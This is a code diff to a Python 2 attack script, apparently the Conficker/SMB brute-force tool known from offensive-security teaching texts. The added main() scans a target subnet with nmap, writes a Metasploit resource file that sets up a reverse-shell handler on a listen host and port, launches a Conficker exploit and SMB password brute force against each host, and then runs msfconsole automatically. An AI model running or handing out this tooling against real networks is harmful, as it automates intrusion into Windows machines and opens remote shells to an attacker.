@@ -1,4 +1,7 @@
 import nmap
+import os
+import optparse
+import sys
 
 
 def findTgts(subNet):
@@ -45,3 +48,32 @@ def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
         configFile.write('set LPROT ' + str(lport) + '\n')
         configFile.write('set LHOST ' + lhost + '\n')
         configFile.write('exploit -j -z\n')
+
+
+def main():
+    configFile = open('meta.rc', 'w')
+    parser = optparse.OptionParser('[-] Usage%prog ' + '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password Files]')
+    parser.add_option('-H', dest='tgtHost', type='string', help='specify the target address[es]')
+    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
+    parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
+    parser.add_option('-F', dest='passwdFile', type='string', help='password file for SMB brute force attempt')
+    (options, args) = parser.parse_args()
+    if (options.tgtHost is None) | (options.lhost is None):
+        print parser.usage
+        exit(0)
+    lhost = options.lhost
+    lport = options.lport
+    if lport is None:
+        lport = '1337'
+    passwdFile = options.passwdFile
+    tgtHosts = findTgts(options.tgtHost)
+    setupHandler(configFile, lhost, lport)
+    for tgtHost in tgtHosts:
+        conflickerExploit(configFile, tgtHost, lhost, lport)
+        if passwdFile is not None:
+            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
+    configFile.close()
+    os.system('msfconsole -r meta.rc')
+
+if __name__ == '__main__':
+    main()
